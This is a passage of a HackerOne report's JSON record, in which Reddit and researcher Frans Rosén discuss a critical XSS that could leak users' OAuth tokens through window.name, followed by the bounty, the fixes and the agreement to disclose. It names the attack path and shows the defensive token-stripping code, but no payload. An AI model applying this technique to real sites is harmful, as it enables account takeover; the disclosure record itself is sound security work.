F%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c6e3db49ae978713beb87713b6e650948f3031c781e84e97798f613886602ff9",
      "file_size": 76178,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 435,
  "voters": [
    "ph03ni6",
    "40rbidd3n",
    "w_h_47",
    "turkm4ny",
    "manuelz120",
    "0xh4cker",
    "jumpydata",
    "oscuridad1010",
    "iambroot",
    "0xm5awy",
    "and 425 more..."
  ],
  "severity": {
    "rating": "critical",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 18825,
    "asset_type": "URL",
    "asset_identifier": "www.reddit.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [

    ],
    "assignable_team_member_groups": [

    ]
  },
  "activities": [
    {
      "id": 16674307,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Great find, writeup and showing full impact! We agree this is a critical, and have a general idea how to prevent this. I'm sending this over to the proper dev team and I'll keep you posted. ",
      "automated_response": false,
      "created_at": "2022-05-12T16:00:39.222Z",
      "updated_at": "2022-05-12T16:00:39.222Z",
      "actor": {
        "username": "les_oeufs",
        "cleared": false,
        "verified": false,
        "url": "/les_oeufs",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/h0feo6gnt1l0itzgfuzmxsgif0vk/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "reddit"
    },
    {
      "id": 16674665,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugTriaged",
      "message": "",
      "automated_response": false,
      "created_at": "2022-05-12T16:39:12.101Z",
      "updated_at": "2022-05-12T16:39:12.101Z",
      "actor": {
        "username": "les_oeufs",
        "cleared": false,
        "verified": false,
        "url": "/les_oeufs",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/h0feo6gnt1l0itzgfuzmxsgif0vk/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "reddit"
    },
    {
      "id": 16674754,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "There is a bit more at play here, but we feel limiting to an approved list of GTM ids (that we own via our Google Tag Manager account) will prevent this vulnerability at its core. Seems like the biggest issue here is us allowing user controlled GTM ids to be loaded in redditmedia.com?",
      "automated_response": false,
      "created_at": "2022-05-12T16:49:59.060Z",
      "updated_at": "2022-05-12T16:52:16.238Z",
      "actor": {
        "username": "les_oeufs",
        "cleared": false,
        "verified": false,
        "url": "/les_oeufs",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/h0feo6gnt1l0itzgfuzmxsgif0vk/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "reddit"
    },
    {
      "id": 16674821,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Yes, that's a great first step, I agree! That will limit the attacker from initiating the XSS on redditmedia.com which is the reason it can reach `frames[1].window.name` in the main window from the attacker window.\n\nThank you for a super quick response!\n\nRegards,\nFrans",
      "automated_response": false,
      "created_at": "2022-05-12T17:00:11.797Z",
      "updated_at": "2022-05-12T17:00:11.797Z",
      "actor": {
        "username": "fransrosen",
        "cleared": true,
        "verified": true,
        "url": "/fransrosen",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "reddit"
    },
    {
      "id": 16972677,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BountyAwarded",
      "message": "We are close to shipping a fix for this, in the meantime I'm awarding you the bounty. I'll keep you posted when we are ready for re-testing.",
      "automated_response": false,
      "created_at": "2022-06-02T16:16:40.818Z",
      "updated_at": "2022-06-02T16:16:40.818Z",
      "actor": {
        "url": "/reddit",
        "ibb": false,
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/710/c1ae53147a025b33b7c8383200432c8b4a9b839a_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "profile": {
          "name": "Reddit"
        }
      },
      "bounty_amount": "10000.0",
      "bonus_amount": "0.0",
      "bounty_currency": "usd",
      "genius_execution_id": null,
      "team_handle": "reddit",
      "collaborator": {
        "username": "fransrosen",
        "url": "/fransrosen"
      }
    },
    {
      "id": 16973703,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Thanks a lot!",
      "automated_response": false,
      "created_at": "2022-06-02T18:18:39.289Z",
      "updated_at": "2022-06-02T18:18:39.289Z",
      "actor": {
        "username": "fransrosen",
        "cleared": true,
        "verified": true,
        "url": "/fransrosen",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "reddit"
    },
    {
      "id": 17015515,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Fix went out this afternoon, so when you get the chance mind confirming the fix? It's mainly around restricting the GTM ids. ",
      "automated_response": false,
      "created_at": "2022-06-07T01:44:05.280Z",
      "updated_at": "2022-06-07T01:44:05.280Z",
      "actor": {
        "username": "les_oeufs",
        "cleared": false,
        "verified": false,
        "url": "/les_oeufs",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/h0feo6gnt1l0itzgfuzmxsgif0vk/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "reddit"
    },
    {
      "id": 17018741,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi,\nYes, I can confirm the restrict is now in place for GTM-ids! This prevents me from running my own GTM-ID in my own iframe to utilize the XSS to reach the `window.name` of the redditmedia-iframe in the Reddit-main window.\n\nThere might still be vulnerable listeners loaded by your own GTM-ids that could potentially give access to the `window.name` of the redditmedia-iframe, but none of the ones I saw now and tested on `GTM-5XVNS82` had any issues as I could see.\n\nMaybe a good thing would be to empty out `search` and `hash` (And also remove those from `href`) from the `window.name` sent to the redditmedia-iframe? Then having a vulnerable listener in your GTM would not leak any params.\n\nRegards,\nFrans",
      "automated_response": false,
      "created_at": "2022-06-07T07:30:16.974Z",
      "updated_at": "2022-06-07T07:30:16.974Z",
      "actor": {
        "username": "fransrosen",
        "cleared": true,
        "verified": true,
        "url": "/fransrosen",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "reddit"
    },
    {
      "id": 17029501,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Are you talking about removing search, hash, and other params from window.name sent to redditmedia from external domains? ",
      "automated_response": false,
      "created_at": "2022-06-07T18:04:38.160Z",
      "updated_at": "2022-06-07T18:04:38.160Z",
      "actor": {
        "username": "les_oeufs",
        "cleared": false,
        "verified": false,
        "url": "/les_oeufs",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/h0feo6gnt1l0itzgfuzmxsgif0vk/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "reddit"
    },
    {
      "id": 17030630,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "I was thinking of always removing them, so `www.reddit.com` never exposes any fragment or query params down to `www.redditmedia.com`. But maybe they are used for analytics or similar? I'm guessing the problem can be avoided in different ways:\n\n1. Use a separate redirect_uri for all \"sign in with\"-solutions, so none of those solutions can end up on a page that renders redditmedia-iframe. And/or:\n2. Prevent leakage of OAuth-params to third parties by preventing those params from getting sent down to the redditmedia-frame completely. Then, none of the third party scripts loaded by redditmedia could access the OAuth-parameters using the `window.name` of the redditmedia-frame:\n{F1761028}",
      "automated_response": false,
      "created_at": "2022-06-07T20:38:31.194Z",
      "updated_at": "2022-06-07T20:38:31.194Z",
      "actor": {
        "username": "fransrosen",
        "cleared": true,
        "verified": true,
        "url": "/fransrosen",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "attachments": [
        {
          "id": 1761028,
          "filename": "Screen_Shot_2022-06-07_at_22.33.38.png",
          "type": "image/png",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/y3eqjt00j9l009n5m0h7mva3bdvi?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2022-06-07_at_22.33.38.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2022-06-07_at_22.33.38.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070114Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6274094844707719fea72f1c9d19e12054a917e1f706d4ca34ebbdb5f1a4a018"
        }
      ],
      "genius_execution_id": null,
      "team_handle": "reddit"
    },
    {
      "id": 17030836,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Ah that makes sense, I was trying to find where you were talking about the initial iframe on reddt.com loading redditmedia. I found where in the code base that is generated, its rather old code, but I think if we try to either blocklist certain params specific to SSO (might be easiest to list these) or allowlist important ones for analytics (possibly harder to quantify). \n\nLittle snippet attached of where I think the culprit exists. I will have to knock on some devs doors to get some extra eyes on this. But I agree this is important to limit in case any sort of XSS is found in the future on redditmedia.com. ",
      "automated_response": false,
      "created_at": "2022-06-07T21:22:27.416Z",
      "updated_at": "2022-06-07T21:22:27.416Z",
      "actor": {
        "username": "les_oeufs",
        "cleared": false,
        "verified": false,
        "url": "/les_oeufs",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/h0feo6gnt1l0itzgfuzmxsgif0vk/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "reddit"
    },
    {
      "id": 17743601,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "@fransrosen Looks like we finally got a fix out for the google tag manager iframe and are sanitizing what parameters it is pulling to clean out any problematic oauth2 params.",
      "automated_response": false,
      "created_at": "2022-07-27T18:30:24.899Z",
      "updated_at": "2022-07-27T18:30:24.899Z",
      "actor": {
        "username": "les_oeufs",
        "cleared": false,
        "verified": false,
        "url": "/les_oeufs",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/h0feo6gnt1l0itzgfuzmxsgif0vk/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "reddit"
    },
    {
      "id": 17762868,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @les_oeufs,\n\nNice, I can see this:\n\n```js\nd = new URLSearchParams(location.search);\n        [\"code\", \"access_token\", \"state\", \"refresh_token\", \"id_token\"].forEach((function(e) {\n            d.delete(e)\n        }\n        ));\n        var c = d.toString()\n          , f = \"\" + location.origin + location.pathname + (c ? \"?\" + c : \"\")\n          , p = t.getLocation = function() {\n            return {\n                href: f,\n                hostname: location.hostname,\n                origin: location.origin,\n                pathname: location.pathname || \"/\",\n                search: c,\n                hash: location.hash.replace(/^#/, \"\")\n            }\n        }\n```\n\nHowever, remember that for both `access_token` and `id_token`, they will be a part of `location.hash` and not `location.search`, like this:\n\n```\nhttps://www.reddir.com/#access_token=xxx&id_token=zzz\n```\nAnd those doesn't seem to be filtered:\n{F1843747}\n\nHope this helps,\n\nRegards,\nFrans",
      "automated_response": false,
      "created_at": "2022-07-29T03:56:39.307Z",
      "updated_at": "2022-07-29T03:56:39.307Z",
      "actor": {
        "username": "fransrosen",
        "cleared": true,
        "verified": true,
        "url": "/fransrosen",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "attachments": [
        {
          "id": 1843747,
          "filename": "Screen_Shot_2022-07-29_at_05.56.20.png",
          "type": "image/png",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ypn6w6h4erf91bmtb2llfegrorbu?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2022-07-29_at_05.56.20.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2022-07-29_at_05.56.20.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070114Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8e72b41687793587b4c5fe417fc521b2742c1a50a44ae38c85797765972a3512"
        }
      ],
      "genius_execution_id": null,
      "team_handle": "reddit"
    },
    {
      "id": 17805839,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hey @fransrosen, we pushed a fix for the parts after the hash still leaking through. We should be good to go now. Let me know if there's anything you want redacted here, will try to aim for full disclosure, but can do limited if you prefer. :)",
      "automated_response": false,
      "created_at": "2022-08-01T23:29:03.919Z",
      "updated_at": "2022-08-01T23:29:03.919Z",
      "actor": {
        "username": "les_oeufs",
        "cleared": false,
        "verified": false,
        "url": "/les_oeufs",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/h0feo6gnt1l0itzgfuzmxsgif0vk/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "reddit"
    },
    {
      "id": 17805843,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugResolved",
      "message": "",
      "automated_response": false,
      "created_at": "2022-08-01T23:29:31.932Z",
      "updated_at": "2022-08-01T23:29:31.932Z",
      "actor": {
        "username": "les_oeufs",
        "cleared": false,
        "verified": false,
        "url": "/les_oeufs",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/h0feo6gnt1l0itzgfuzmxsgif0vk/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "reporter": {
        "username": "fransrosen",
        "url": "/fransrosen"
      },
      "genius_execution_id": null,
      "team_handle": "reddit"
    },
    {
      "id": 17814812,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "I'd love to do a full disclosure :)",
      "automated_response": false,
      "created_at": "2022-08-02T15:00:16.226Z",
      "updated_at": "2022-08-02T15:00:16.226Z",
      "first_to_agree": true,
      "actor": {
        "username": "fransrosen",
        "cleared": true,
        "verified": true,
        "url": "/fransrosen",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "reddit"
    },
    {
      "id": 17814966,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2022-08-02T15:13:53.725Z",
      "updated_at": "2022-08-02T15:13:53.725Z",
      "actor": {
        "username": "les_oeufs",
        "cleared": false,
        "verified": false,
        "url": "/les_oeufs",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/h0feo6gnt1l0itzgfuzmxsgif0vk/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "reddit"
    },
    {
      "id": 17814967,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportBecamePublic",
      "message": "",
      "automated_response": false,
      "created_at": "2022-08-02T15:13:53.910Z",
      "updated_at": "2022-08-02T15:13:53.910Z",
      "actor": {
        "username": "les_oeufs",
        "cleared": false,
        "verified": false,
        "url": "/les_oeufs",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/h0feo6gnt1l0itzgfuzmxsgif0vk/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "reddit"
    }
  ],
  "activity_page_count": 1,
  "activity_page_number": 1,
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}